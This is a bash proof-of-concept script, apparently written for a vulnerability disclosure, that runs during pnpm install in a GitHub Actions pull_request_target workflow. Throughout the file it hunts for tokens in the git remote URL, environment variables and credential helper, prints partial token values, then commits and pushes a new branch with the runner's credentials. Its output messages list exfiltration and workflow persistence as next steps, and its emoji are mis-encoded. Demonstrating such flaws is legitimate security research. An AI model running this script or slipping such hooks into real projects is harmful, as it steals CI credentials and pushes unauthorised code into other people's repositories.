#!/bin/bash

# POC Script - Demonstrates git credential access during pnpm install
# This script runs during pnpm install lifecycle

echo "================================================"
echo "üö® POC: Git Credentials are accessible!"
echo "================================================"

# Generate unique branch name
BRANCH_NAME="poc-exploit-$(date +%s)"

echo "üìç Current directory: $(pwd)"
echo "üìç Git remote: $(git remote get-url origin 2>/dev/null || echo 'Not available')"
echo "üìç Current branch: $(git branch --show-current 2>/dev/null || echo 'Not available')"
echo ""

# Check git config for credentials
echo "üîç Checking git configuration for credentials..."
GIT_URL=$(git config --get remote.origin.url 2>/dev/null)
if [[ "$GIT_URL" == *"x-access-token"* ]] || [[ "$GIT_URL" == *"@"* ]]; then
    echo "‚úÖ Git remote URL contains authentication token!"
    echo "   URL pattern: ${GIT_URL:0:50}..."
fi

# Check for various token environment variables
echo ""
echo "üîç Checking environment for tokens..."
if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "‚úÖ GITHUB_TOKEN found: ${GITHUB_TOKEN:0:10}...${GITHUB_TOKEN: -4}"
fi
if [ ! -z "$GH_TOKEN" ]; then
    echo "‚úÖ GH_TOKEN found: ${GH_TOKEN:0:10}...${GH_TOKEN: -4}"
fi
if [ ! -z "$INPUT_GITHUB_TOKEN" ]; then
    echo "‚úÖ INPUT_GITHUB_TOKEN found: ${INPUT_GITHUB_TOKEN:0:10}...${INPUT_GITHUB_TOKEN: -4}"
fi

# Try to extract token from git credential storage
echo ""
echo "üîç Attempting to extract credentials from git..."
GIT_CRED=$(git config --get credential.helper 2>/dev/null)
if [ ! -z "$GIT_CRED" ]; then
    echo "‚úÖ Git credential helper configured: $GIT_CRED"
fi

echo ""
echo "üéØ Attempting to create and push branch: $BRANCH_NAME"
echo "   Using git commands (which use configured credentials)..."
echo ""

# Create a new branch and try to push it
git checkout -b "$BRANCH_NAME" 2>&1 | head -5

# Create a marker file to make this branch unique
echo "POC: This branch was created by exploit-poc.sh at $(date)" > .poc-marker.txt
git add .poc-marker.txt 2>&1 | head -5

# Commit the marker
git commit -m "POC: Proof of pull_request_target exploitation" 2>&1 | head -5

# Try to push the branch
echo ""
echo "üì§ Pushing branch to remote..."
PUSH_OUTPUT=$(git push origin "$BRANCH_NAME" 2>&1)
PUSH_EXIT_CODE=$?

echo "$PUSH_OUTPUT" | head -20

echo ""
if [ $PUSH_EXIT_CODE -eq 0 ]; then
    echo "================================================"
    echo "‚úÖ SUCCESS! Branch pushed: $BRANCH_NAME"
    echo "üö® VULNERABILITY CONFIRMED!"
    echo "================================================"
    echo ""
    echo "This demonstrates that an attacker can:"
    echo "  ‚úì Create and push branches"
    echo "  ‚úì Commit code to the repository"
    echo "  ‚úì Potentially modify protected branches"
    echo "  ‚úì Exfiltrate credentials"
    echo "  ‚úì Modify workflow files for persistence"
    echo ""
    echo "The branch '$BRANCH_NAME' has been created."
    echo "Check the repository to verify!"
    echo ""
else
    echo "================================================"
    echo "‚ö†Ô∏è  Push failed (exit code: $PUSH_EXIT_CODE)"
    echo "================================================"

    if [[ "$PUSH_OUTPUT" == *"403"* ]] || [[ "$PUSH_OUTPUT" == *"Permission"* ]]; then
        echo ""
        echo "The credentials exist but may lack push permissions."
        echo "However, this still demonstrates credential access."
        echo ""
        echo "Attacker could still:"
        echo "  - Exfiltrate the credentials"
        echo "  - Use them for read operations"
        echo "  - Use them with GitHub API"
        echo ""
    elif [[ "$PUSH_OUTPUT" == *"Authentication"* ]]; then
        echo ""
        echo "No authentication configured, but in GitHub Actions"
        echo "context, actions/checkout sets up authentication."
        echo ""
    fi
fi

echo "================================================"
echo "POC Complete"
echo "================================================"
